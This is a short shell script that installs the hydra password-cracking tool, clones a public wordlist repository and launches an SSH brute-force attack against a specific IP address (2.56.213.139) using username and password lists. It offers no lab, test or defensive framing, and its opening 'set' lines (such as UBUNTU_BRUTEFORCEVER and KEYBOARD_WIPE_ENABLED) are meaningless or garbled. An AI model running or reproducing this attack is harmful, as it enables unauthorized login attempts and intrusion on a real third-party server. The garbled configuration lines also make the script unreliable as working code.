# Requried FrameWork

set FRAMEWORK_VER = 8

set SUDO_VERSION = 3
set UBUNTU_BRUTEFORCEVER = 9
set UBUNTU = 21
set CURSORVER = 20
set KEYBOARD_WIPE_ENABLED = 0 
set WHEN_CONTROL_C_DO = 0
# Wipe Changes
sudo apt install hydra -y
echo Complete
echo Clone please wait
# When Installed
git clone https://github.com/jeanphorn/wordlist.git
echo clone completed
cd wordlist
echo bruteforceing..
hydra -L usernames.txt -P ssh_passwd.txt 2.56.213.139 ssh
echo closed
